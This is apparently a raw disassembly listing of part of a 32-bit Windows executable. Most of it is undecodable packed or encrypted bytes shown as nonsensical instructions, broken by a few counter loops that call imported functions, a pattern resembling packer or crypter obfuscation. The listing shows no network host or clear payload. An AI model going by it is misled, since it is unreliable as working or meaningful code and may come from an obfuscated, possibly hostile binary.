  406eda:	stos   DWORD PTR es:[edi],eax
  406edb:	lahf   
  406edc:	mov    ss,WORD PTR [edx]
  406ede:	mov    WORD PTR [ebx],gs
  406ee0:	sbb    edx,ebx
  406ee2:	stos   DWORD PTR es:[edi],eax
  406ee3:	adc    dh,0xd4
  406ee6:	stos   DWORD PTR es:[edi],eax
  406ee7:	xor    esp,edi
  406ee9:	aad    0x5a
  406eeb:	aam    0xac
  406eed:	adc    edi,DWORD PTR [eax-0x3a]
  406ef0:	jns    0x406f65
  406ef2:	mov    cl,0x4a
  406ef4:	cmp    BYTE PTR [eax+0x14],0x88
  406ef8:	fnstsw WORD PTR [ebx-0x3868a935]
  406efe:	pop    ds
  406eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f00:	jbe    0x406eca
  406f02:	jmp    0xd3961d96
  406f07:	cwde   
  406f08:	enter  0x8f07,0x73
  406f0c:	in     eax,0xc
  406f0e:	pop    ss
  406f0f:	inc    eax
  406f10:	mov    edx,0x80695fa3
  406f15:	cs mov ecx,0xf1ff435d
  406f1b:	fwait
  406f1c:	xor    eax,0x78de773
  406f21:	or     BYTE PTR [edi-0x1f],0x11
  406f25:	jg     0x406f27
  406f27:	pop    ebx
  406f28:	and    al,BYTE PTR [bx+di]
  406f2b:	shr    DWORD PTR [esi-0x686e13f1],0x5b
  406f32:	dec    ebx
  406f33:	dec    dx
  406f35:	mov    ebp,0x14d145f8
  406f3a:	fwait
  406f3b:	repz addr16 in eax,dx
  406f3e:	ss jo  0x406eca
  406f41:	(bad)  [edx+0x494060f4]
  406f47:	fadd   DWORD PTR [esi]
  406f49:	sub    eax,0xeacc82f5
  406f4e:	int3   
  406f4f:	pop    eax
  406f50:	jae    0x406f4e
  406f52:	test   DWORD PTR [edi-0x3e],edi
  406f55:	cmp    bh,BYTE PTR [ebx-0x195ab504]
  406f5b:	cli    
  406f5c:	xchg   esi,eax
  406f5d:	out    dx,al
  406f5e:	data16 jnp 0x406f1d
  406f61:	aas    
  406f62:	xchg   DWORD PTR ds:0x358b5a34,ecx
  406f68:	(bad)
  406f6d:	xor    eax,0x3189b1d
  406f72:	lds    edx,FWORD PTR [ebx-0x74]
  406f75:	leave  
  406f76:	xchg   edx,eax
  406f77:	inc    ebp
  406f78:	dec    eax
  406f79:	adc    BYTE PTR [eax+0x48],ah
  406f7c:	or     DWORD PTR [edi+0xc],edx
  406f7f:	push   esp
  406f80:	out    dx,eax
  406f81:	xchg   ecx,eax
  406f82:	cwde   
  406f83:	scas   al,BYTE PTR es:[edi]
  406f84:	and    dl,BYTE PTR [ebp-0x70]
  406f87:	out    0x66,al
  406f89:	add    eax,ecx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x13,al
  40702c:	lods   eax,DWORD PTR ds:[esi]
  40702d:	(bad)  
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407025
  407038:	test   BYTE PTR [ebx-0x3fc778],dl
  40703e:	mov    eax,DWORD PTR [eax+eax*8-0x33]
  407042:	daa    
  407043:	sub    al,0x4d
  407045:	repnz sub BYTE PTR fs:[ebx],dh
  407049:	adc    eax,0xed8fa43b
  40704e:	add    BYTE PTR [ebp-0x80],al
  407051:	mov    edx,0xb0fa6c19
  407056:	call   0x1488:0x7ddab5ef
  40705d:	push   ds
  40705e:	and    BYTE PTR [esi-0x5025c683],dl
  407064:	rcr    DWORD PTR [esi+0x56b60b9b],0x90
  40706b:	sti    
  40706c:	dec    esp
  40706d:	popf   
  40706e:	mov    DWORD PTR [esi-0x2a70756f],ebx
  407074:	xor    DWORD PTR [eax],edi
  407076:	or     BYTE PTR [ebx-0x60acaebe],cl
  40707c:	sahf   
  40707d:	ins    DWORD PTR es:[edi],dx
  40707e:	jae    0x4070c1
  407080:	jb     0x40705e
  407082:	xchg   BYTE PTR [edi],al
  407084:	xor    edi,esp
  407086:	je     0x4070e5
  407088:	enter  0xf510,0x79
  40708c:	cmp    DWORD PTR [esi],0xffffffdc
  40708f:	call   0xb78d129
  407094:	sub    DWORD PTR [esi+eax*4],esi
  407097:	jmp    0xa481452f
  40709c:	cld    
  40709d:	cmp    BYTE PTR [eax],dl
  40709f:	sub    DWORD PTR [edi+0x11],edx
  4070a2:	into   
  4070a3:	mov    ebp,0x23195acc
  4070a8:	add    DWORD PTR [ebx-0x4011a36a],0xffffffae
  4070af:	and    cl,ah
  4070b1:	xchg   ebx,eax
  4070b2:	ja     0x4070ee
  4070b4:	sbb    al,0xfa
  4070b6:	mov    dh,0x9d
  4070b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b9:	xchg   ecx,eax
  4070ba:	mov    WORD PTR [esi+esi*2-0x67],ds
  4070be:	sti    
  4070bf:	jne    0x407094
  4070c1:	and    eax,0x8fbaca42
  4070c6:	xchg   ebx,eax
  4070c7:	scas   al,BYTE PTR es:[edi]
  4070c8:	xor    esp,ebx
  4070ca:	call   0x4edc:0xc58bb69f
  4070d1:	and    ch,BYTE PTR [ebx]
  4070d3:	xor    ebp,DWORD PTR [ebx]
  4070d5:	and    BYTE PTR [eax+edi*4+0x235b5c91],bh
  4070dc:	mov    ah,0xd4
  4070de:	jns    0x407111
  4070e0:	ret    0xe2ca
  4070e3:	test   eax,0x69c9c666
  4070e9:	(bad)  
  4070eb:	jg     0x407108
  4070ed:	sbb    ah,ah
  4070ef:	dec    ebx
  4070f0:	lea    ebx,[ebx-0x7b875e53]
  4070f6:	mov    eax,ds:0x141b4d82
  4070fb:	rol    edx,1
  4070fd:	cmp    esp,DWORD PTR [edx+0x35]
  407100:	repz or eax,0xf3f3dbb
  407106:	jb     0x4070d0
  407108:	fdivr  DWORD PTR [ecx+0x2b48bc36]
  40710e:	push   ebx
  40710f:	je     0x407109
  407111:	or     eax,0xee089e97
  407116:	add    DWORD PTR [ebp-0x42d6688d],esi
  40711c:	push   ebp
  40711d:	(bad)  
  40711e:	pop    eax
  40711f:	or     cl,BYTE PTR [edx+0xe]
  407122:	jl     0x4070ac
  407124:	sar    cl,1
  407126:	leave  
  407127:	lea    esi,cs:[esi]
  40712a:	add    al,0x10
  40712c:	cld    
  40712d:	dec    ecx
  40712e:	pop    edx
  40712f:	mov    al,0xd4
  407131:	mov    ecx,0x1c6849c1
  407136:	dec    ebp
  407137:	(bad)  
  407138:	cmc    
  407139:	sub    eax,0xc13b5c92
  40713e:	jmp    0xb581b6cd
  407143:	push   esp
  407144:	sahf   
  407145:	inc    eax
  407146:	je     0x407195
  407148:	cmc    
  407149:	fidivr DWORD PTR [ebp-0x9a9c7e]
  40714f:	fadd   QWORD PTR [ebx+0x7e]
  407152:	(bad)  
  407153:	daa    
  407154:	inc    esp
  407155:	xchg   edx,ecx
  407157:	shl    ch,0x91
  40715a:	(bad)  
  40715b:	pop    ecx
  40715c:	in     al,0xc1
  40715e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40715f:	popf   
  407160:	sbb    BYTE PTR [esi-0x6182da5],ch
  407166:	mov    cs,WORD PTR [ecx*2-0x24a7960a]
  40716d:	outs   dx,BYTE PTR ds:[esi]
  40716e:	lods   eax,DWORD PTR ds:[esi]
  40716f:	int3   
  407170:	xor    DWORD PTR [ebx],ebx
  407172:	push   esp
  407173:	stos   DWORD PTR es:[edi],eax
  407174:	mov    edi,0xa2cab24b
  407179:	rcl    DWORD PTR [edx+0x9f61202],1
  40717f:	inc    edx
  407180:	ins    BYTE PTR es:[edi],dx
  407181:	and    edx,DWORD PTR [ebp+0x2d9c7956]
  407187:	fistp  DWORD PTR [ebx]
  407189:	jb     0x40714c
  40718b:	jae    0x4071a3
  40718d:	xchg   ebp,ebx
  40718f:	jmp    0x40719b
  407191:	push   0xffffff97
  407193:	gs push ecx
  407195:	inc    ebp
  407197:	pop    esi
  407198:	aad    0x2
  40719a:	(bad)  
  40719b:	ds fwait
  40719d:	adc    DWORD PTR ds:0xa18df98b,eax
  4071a3:	pop    ds
  4071a4:	(bad)  
  4071a6:	jne    0x40717d
  4071a8:	and    DWORD PTR [edi+edi*8-0x77],ebx
  4071ac:	add    esi,DWORD PTR [esi-0x582a4b4]
  4071b2:	adc    dh,BYTE PTR [esi]
  4071b4:	and    ecx,edi
  4071b6:	cmp    eax,DWORD PTR [eax+0x51]
  4071b9:	aaa    
  4071ba:	ss dec eax
  4071bc:	or     dh,BYTE PTR [esi+0x31d74aba]
  4071c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c3:	xor    ebp,DWORD PTR [ebp+0x4e]
  4071c6:	std    
  4071c7:	fsub   st,st(6)
  4071c9:	add    edi,ebx
  4071cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071cc:	retf   0xfd68
  4071cf:	pop    edx
  4071d0:	pushf  
  4071d1:	test   BYTE PTR [ebx+0x1d3f6d84],dl
  4071d7:	xor    eax,0x2565000f
  4071dc:	out    dx,al
  4071dd:	fwait
  4071de:	pop    eax
  4071df:	shl    DWORD PTR [edx-0x545de94e],cl
  4071e5:	loopne 0x407249
  4071e7:	jmp    0x15951a46
  4071ec:	or     eax,0x366ffd55
  4071f1:	mov    eax,ecx
  4071f3:	hlt    
  4071f4:	pop    esp
  4071f5:	ds sti 
  4071f7:	ds in  al,0x40
  4071fa:	aam    0xde
  4071fc:	(bad)  
  4071fe:	test   BYTE PTR [ebp-0x3c5761cb],bl
  407204:	sahf   
  407205:	mov    ebp,0xf4ecf802
  40720a:	jae    0x4071f4
  40720c:	mov    al,0x45
  40720e:	test   al,0xd6
  407210:	mov    ?,WORD PTR [edi]
  407212:	lahf   
  407213:	xor    al,0xd3
  407215:	sub    DWORD PTR [ebp-0x13],esi
  407218:	imul   esp,DWORD PTR [ecx+ebp*1],0x3440f29e
  40721f:	cli    
  407220:	jmp    0x41d2:0x2248de73
  407227:	or     BYTE PTR [edi-0x3edc258e],al
  40722d:	push   ebx
  40722e:	mov    dl,0x3f
  407230:	lock aaa 
  407232:	xchg   edi,eax
  407233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407234:	in     al,0xb
  407236:	into   
  407237:	inc    edx
  407238:	push   ds
  407239:	icebp  
  40723a:	stos   BYTE PTR es:[edi],al
  40723b:	mov    BYTE PTR [ecx-0x5eb9b212],bl
  407241:	inc    ebp
  407242:	mov    DWORD PTR [edi],edx
  407244:	cmp    DWORD PTR [esi-0x7d],esi
  407247:	and    bl,BYTE PTR [edx-0x475a548f]
  40724d:	mov    eax,0x39b28f55
  407252:	loopne 0x40729f
  407254:	jp     0x4071fe
  407256:	pop    edx
  407257:	popf   
  407258:	scas   al,BYTE PTR es:[edi]
  407259:	adc    BYTE PTR [ebp-0xf],bl
  40725c:	or     eax,0x94bae79f
  407261:	mov    bh,0x57
  407263:	xchg   DWORD PTR [esi+ebx*2-0x124c1c6],ebp
  40726a:	ret    
  40726b:	iret   
  40726c:	mov    ch,0x1d
  40726e:	sbb    eax,0xc4749343
  407273:	and    BYTE PTR [esi-0x29e0164d],0x44
  40727a:	xchg   edx,eax
  40727b:	ja     0x4072bf
  40727d:	ror    BYTE PTR [esi+0x6e749f09],1
  407283:	push   eax
  407284:	rcl    DWORD PTR [ecx],cl
  407286:	hlt    
  407287:	out    dx,eax
  407288:	(bad)  
  407289:	out    dx,al
  40728a:	fadd   st,st(7)
  40728c:	(bad)  [edi+eax*4+0x7f]
  407290:	(bad)  
  407291:	jmp    0xfa443290
  407296:	xor    ecx,0x14
  407299:	sub    al,0x20
  40729b:	add    eax,0x81e84434
  4072a0:	push   edi
  4072a1:	mov    esi,0x9b435961
  4072a6:	in     eax,0x6c
  4072a8:	imul   esi,DWORD PTR [ebx],0xdc701dc5
  4072ae:	mov    bl,bl
  4072b0:	neg    DWORD PTR [edi+edi*4-0x133692dc]
  4072b7:	rol    BYTE PTR [ecx-0x4831552e],1
  4072bd:	jbe    0x4072f9
  4072bf:	scas   al,BYTE PTR es:[edi]
  4072c0:	sbb    eax,0xcaa6f89f
  4072c5:	mov    eax,0x9231cbb2
  4072ca:	mov    edx,0x33114eb
  4072cf:	push   esi
  4072d0:	xchg   esp,eax
  4072d1:	xor    bl,dl
  4072d3:	jecxz  0x4072e4
  4072d5:	inc    eax
  4072d6:	fisttp DWORD PTR [esi+0x2a7e0f4a]
  4072dc:	(bad)  
  4072dd:	cmc    
  4072de:	sbb    edx,DWORD PTR [eax]
  4072e0:	or     bh,BYTE PTR [eax-0x41]
  4072e3:	push   esp
  4072e4:	jl     0x4072b3
  4072e6:	loope  0x4072a2
  4072e8:	icebp  
  4072e9:	xchg   ecx,eax
  4072ea:	sbb    BYTE PTR [edx-0x2d],dh
  4072ed:	out    dx,al
  4072ee:	lods   eax,DWORD PTR ds:[esi]
  4072ef:	sbb    ecx,DWORD PTR [eax]
  4072f1:	jae    0x407275
  4072f3:	add    ebx,DWORD PTR [ecx-0x6c]
  4072f6:	or     dl,BYTE PTR [edi-0x1a]
  4072f9:	(bad)  
  4072fa:	in     al,0x59
  4072fc:	fsubp  st(2),st
  4072fe:	adc    eax,0xe0adc2da
  407303:	imul   edi,DWORD PTR [edi],0xb
  407306:	shr    esp,0x38
  407309:	adc    DWORD PTR [eax],0x5c
  40730c:	mov    ?,ebx
  40730e:	jle    0x4072d7
  407310:	daa    
  407311:	in     al,0x1f
  407313:	xchg   edi,eax
  407314:	in     al,dx
  407315:	in     al,0x62
  407317:	sbb    DWORD PTR [ebx+0x45ea56b0],0xc0d18971
  407321:	or     BYTE PTR [edx-0x3a],cl
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x21d0f3d0,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073aa
  4073b7:	inc    ecx
  4073b8:	cs cdq 
  4073ba:	ss xchg esi,eax
  4073bc:	pop    ebx
  4073bd:	mov    ds:0x2b264864,eax
  4073c2:	mov    cl,BYTE PTR [eax]
  4073c4:	je     0x407347
  4073c6:	lds    esi,FWORD PTR [ebx-0x5d]
  4073c9:	pushf  
  4073ca:	and    ebp,edi
  4073cc:	lods   al,BYTE PTR cs:[esi]
  4073ce:	leave  
  4073cf:	jo     0x4073ad
  4073d1:	add    ecx,edx
  4073d3:	data16 hlt 
  4073d5:	in     al,0x69
  4073d7:	js     0x407455
  4073d9:	aad    0x3a
  4073db:	enter  0xec7c,0xa
  4073df:	mov    bl,0xbb
  4073e1:	ds mov esi,0x57d46d5e
  4073e7:	jecxz  0x4073d5
  4073e9:	out    dx,eax
  4073ea:	push   eax
  4073eb:	dec    eax
  4073ec:	or     BYTE PTR [ecx],al
  4073ee:	inc    edi
  4073ef:	int3   
  4073f0:	and    cl,BYTE PTR [edx-0x30]
  4073f3:	dec    ecx
  4073f4:	cmp    esi,eax
  4073f6:	adc    cl,cl
  4073f8:	pop    ecx
  4073f9:	in     eax,dx
  4073fa:	dec    esp
  4073fb:	add    bh,BYTE PTR [edi-0x30]
  4073fe:	inc    edx
  4073ff:	dec    ebp
  407400:	push   0xffffffa0
  407402:	mov    edi,0x19744795
  407407:	xor    ch,BYTE PTR [edx+0x7d]
  40740a:	push   eax
  40740b:	sub    BYTE PTR [ebx],cl
  40740d:	sbb    ecx,DWORD PTR [edi+0x5518bc1f]
  407413:	mov    BYTE PTR [edx],al
  407415:	pop    edi
  407416:	test   dl,bl
  407418:	jle    0x407425
  40741a:	addr16 repz sbb edx,edx
  40741e:	xor    esi,DWORD PTR [eax]
  407420:	jno    0x407407
  407422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407423:	push   ds
  407424:	adc    ebp,edx
  407426:	add    ebp,edx
  407428:	ins    BYTE PTR es:[edi],dx
  407429:	mov    ebx,DWORD PTR [eax+0x7d]
  40742c:	adc    DWORD PTR [ebx+eiz*1],esp
  40742f:	out    0x5b,eax
  407431:	jbe    0x407498
  407433:	jmp    0x40745f
  407435:	sub    DWORD PTR [edi+0x1c],edx
  407438:	push   ebp
  407439:	sti    
  40743a:	call   0x5a462dca
  40743f:	and    ecx,DWORD PTR [ebp-0xfdf33f6]
  407445:	loopne 0x407423
  407447:	scas   eax,DWORD PTR es:[edi]
  407448:	stc    
  407449:	push   ss
  40744a:	jle    0x407429
  40744c:	inc    edi
  40744d:	sub    BYTE PTR [edx],0xde
  407450:	adc    dl,BYTE PTR ds:0xf93c1aae
  407456:	pop    edx
  407457:	aas    
  407458:	into   
  407459:	xor    eax,DWORD PTR [edx-0x75723caa]
  40745f:	lahf   
  407460:	in     eax,dx
  407461:	or     bh,BYTE PTR [esi]
  407463:	sub    ch,bh
  407465:	push   esp
  407466:	dec    edx
  407467:	adc    BYTE PTR [edx+0x19],ch
  40746a:	dec    edi
  40746b:	or     eax,0x6735460
  407470:	(bad)  
  407471:	mov    dl,0xc
  407473:	sub    BYTE PTR [edx+0x6e4b627f],dh
  407479:	mov    cl,0xdd
  40747b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40747c:	pop    esi
  40747d:	int    0x45
  40747f:	ins    BYTE PTR es:[edi],dx
  407480:	lock push eax
  407482:	retf   0x69d4
  407485:	out    dx,eax
  407486:	shr    BYTE PTR [eax],cl
  407488:	ret    
  407489:	cmc    
  40748a:	and    al,0x66
  40748c:	ins    BYTE PTR es:[edi],dx
  40748d:	push   edx
  40748e:	call   0xcdf9e80
  407493:	jb     0x407486
  407495:	sub    BYTE PTR [edx-0x71],ah
  407498:	aad    0xd8
  40749a:	mov    esp,0x67a3ba7c
  40749f:	outs   dx,DWORD PTR ds:[esi]
  4074a0:	ret    
  4074a1:	add    edi,DWORD PTR [ecx]
  4074a3:	adc    al,0x97
  4074a5:	std    
  4074a6:	in     eax,0xea
  4074a8:	std    
  4074a9:	push   ebx
  4074aa:	outs   dx,BYTE PTR ds:[esi]
  4074ab:	retf   0x6603
  4074ae:	xchg   ebx,eax
  4074af:	adc    esp,DWORD PTR [edx+0x76]
  4074b2:	jmp    0x594e:0xa00d3b92
  4074b9:	call   0x24f0caff
  4074be:	push   ss
  4074bf:	sbb    al,0x1e
  4074c1:	ret    0x4bcd
  4074c4:	dec    esi
  4074c5:	jp     0x407529
  4074c7:	lods   al,BYTE PTR ds:[esi]
  4074c8:	pop    ebp
  4074c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ca:	cwde   
  4074cb:	dec    esp
  4074cc:	xchg   ebx,eax
  4074cd:	hlt    
  4074ce:	xor    BYTE PTR [ecx+0x1dd89d45],al
  4074d4:	push   ecx
  4074d5:	shr    BYTE PTR [edi+ecx*1],0x35
  4074d9:	xor    ebx,DWORD PTR [eax-0x12f4620b]
  4074df:	cs stos BYTE PTR es:[edi],al
  4074e1:	sti    
  4074e2:	fucom  st(7)
  4074e4:	arpl   WORD PTR [ebp+0x63a14cb6],sp
  4074ea:	fcom   DWORD PTR ds:0x99cfcb41
  4074f0:	fmul   QWORD PTR [edx-0x35af4afc]
  4074f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074f7:	pop    cx
  4074f9:	out    0xdb,eax
  4074fb:	retf   
  4074fc:	mov    ds:0xcc02bb9a,eax
  407501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407502:	movlps QWORD PTR [edx],xmm5
  407505:	xlat   BYTE PTR ds:[ebx]
  407506:	in     eax,dx
  407507:	int    0x18
  407509:	push   ebx
  40750a:	mov    ebx,0xc8205852
  40750f:	imul   ebx,DWORD PTR [ebp+eax*1+0x54],0x9f529352
  407517:	call   0xfe9e8bc4
  40751c:	pop    edi
  40751d:	xchg   ebp,eax
  40751e:	dec    esi
  40751f:	adc    al,0xec
  407521:	retf   0x49ae
  407524:	sbb    dh,0x4a
  407527:	test   DWORD PTR [esi-0x2a],ebp
  40752a:	aas    
  40752b:	loope  0x4074af
  40752d:	mov    es,WORD PTR [edi+esi*4+0x5680e9d2]
  407534:	ds mov dl,0xf
  407537:	mov    edx,0x4ba4c898
  40753c:	pop    ss
  40753d:	ror    cl,1
  40753f:	push   eax
  407540:	or     eax,0x80c3f1c3
  407545:	shr    DWORD PTR [edi+0x33],cl
  407548:	adc    eax,0x56baadfb
  40754d:	cmp    DWORD PTR [esp+ebx*8+0x1312c4a2],esi
  407554:	mov    ch,0x4f
  407556:	lahf   
  407557:	lock das 
  407559:	ins    BYTE PTR es:[edi],dx
  40755a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40755b:	jb     0x40758c
  40755d:	fistp  WORD PTR [ecx+eiz*2-0x60]
  407561:	xchg   ebp,eax
  407562:	sub    eax,0x132b7fcc
  407567:	jecxz  0x40752f
  407569:	inc    edx
  40756a:	ror    DWORD PTR ds:0x6adac351,0x9d
  407571:	int3   
  407572:	loopne 0x407509
  407574:	imul   edi,DWORD PTR [edx+0x22],0x753736fc
  40757b:	push   esp
  40757c:	mov    bl,0x78
  40757e:	outs   dx,DWORD PTR ds:[esi]
  40757f:	xchg   edx,eax
  407580:	pop    edx
  407581:	and    al,0x89
  407583:	sbb    esi,esi
  407585:	inc    ebx
  407586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407587:	dec    ebp
  407588:	and    DWORD PTR [edi],ebp
  40758a:	jno    0x4075a8
  40758c:	mov    eax,ds:0x90729a6c
  407591:	inc    esp
  407592:	inc    ebp
  407593:	add    al,0x13
  407595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407596:	bound  edx,QWORD PTR [ecx+0x12]
  407599:	cmp    ah,BYTE PTR [edx]
  40759b:	push   ebp
  40759c:	pop    eax
  40759d:	aaa    
  40759e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40759f:	push   eax
  4075a0:	push   0x16d50911
  4075a5:	mov    edi,0x5b798a87
  4075aa:	dec    ebx
  4075ab:	jg     0x407608
  4075ad:	jle    0x407615
  4075af:	neg    BYTE PTR [edi+0x4b]
  4075b2:	xchg   ecx,eax
  4075b3:	les    eax,FWORD PTR [ebp+0x41877859]
  4075b9:	dec    ebp
  4075ba:	stc    
  4075bb:	xor    al,0xca
  4075bd:	mov    ebx,DWORD PTR ds:0x299262a8
  4075c3:	imul   esp,DWORD PTR [edx],0x9d664e92
  4075c9:	dec    eax
  4075ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075cb:	xchg   ebp,eax
  4075cc:	dec    ecx
  4075cd:	test   BYTE PTR [eax+0x47],dl
  4075d0:	or     edi,DWORD PTR [edi-0x7f04fdcc]
  4075d6:	or     ebp,DWORD PTR ds:0x1c82c3c3
  4075dc:	mov    esi,0x9a9f76fa
  4075e1:	fadd   st(2),st
  4075e3:	xchg   ebx,eax
  4075e4:	scas   eax,DWORD PTR es:[edi]
  4075e5:	pop    ebp
  4075e6:	fisub  WORD PTR [esi]
  4075e8:	adc    eax,DWORD PTR [ebx+0x7c]
  4075eb:	fbld   TBYTE PTR [eax]
  4075ed:	sbb    BYTE PTR [esi],al
  4075ef:	and    al,0x6
  4075f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075f2:	adc    al,0x68
  4075f4:	xor    al,BYTE PTR [esi+0x60e8a25]
  4075fa:	and    DWORD PTR [edi+ecx*2-0x6e7ae226],esp
  407601:	fcmovne st,st(5)
  407603:	std    
  407604:	inc    DWORD PTR ds:0xf9a17395
  40760a:	mov    esp,0x1b631972
  40760f:	push   esi
  407610:	inc    esi
  407611:	imul   ch
  407613:	jge    0x40761a
  407615:	stos   DWORD PTR es:[edi],eax
  407616:	pop    ds
  407617:	pop    eax
  407618:	mov    edi,0x6c326e1b
  40761d:	sbb    DWORD PTR [ebp-0x2dd88a5],esp
  407623:	xor    edi,esp
  407625:	lock sub ebp,DWORD PTR [edx-0x4b]
  407629:	inc    edi
  40762a:	jno    0x407663
  40762c:	sbb    DWORD PTR [ebx],edx
  40762e:	sub    dh,BYTE PTR [edx-0x7f]
  407631:	mov    ebx,0xa579b73c
  407636:	inc    edx
  407637:	or     eax,0x1bfc46f
  40763c:	mov    ch,0xe7
  40763e:	sub    al,0x66
  407640:	jmp    0x9518:0x7f0af687
  407647:	mov    bh,0x35
  407649:	in     eax,dx
  40764a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40764b:	push   ecx
  40764c:	in     eax,dx
  40764d:	cdq    
  40764e:	pop    ebp
  40764f:	(bad)  
  407650:	(bad)  
  407651:	out    0xbb,eax
  407653:	or     ecx,DWORD PTR [edx-0x33]
  407656:	out    dx,al
  407657:	call   0xb04783a2
  40765c:	and    eax,0x1e6f96fd
  407661:	ss jmp 0x4e71:0x40a8d72e
  407669:	or     eax,0x4d5bad7c
  40766e:	into   
  40766f:	stos   BYTE PTR es:[edi],al
  407670:	inc    ebx
  407671:	xchg   ecx,eax
  407672:	icebp  
  407673:	js     0x407648
  407675:	shr    BYTE PTR [edi],1
  407677:	in     al,0x5d
  407679:	adc    al,0xc0
  40767b:	adc    DWORD PTR [eax+0x14ab5a24],eax
  407681:	xchg   edx,eax
  407682:	dec    ebp
  407683:	jle    0x4076ec
  407685:	mov    BYTE PTR [esi],cl
  407687:	retf   0x8623
  40768a:	call   0xdfac14f9
  40768f:	dec    ecx
  407690:	mov    al,ds:0x31c3b156
  407695:	xchg   DWORD PTR [ebp+0x4c80fc31],ecx
  40769b:	ss (bad) 
  40769d:	ror    bh,1
  40769f:	jg     0x40762b
  4076a1:	mov    ecx,0x8af04589
  4076a6:	inc    ebp
  4076a7:	inc    DWORD PTR [ecx+0x42a7610d]
  4076ad:	add    al,bh
  4076af:	ins    BYTE PTR es:[edi],dx
  4076b0:	add    BYTE PTR [eax],al
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
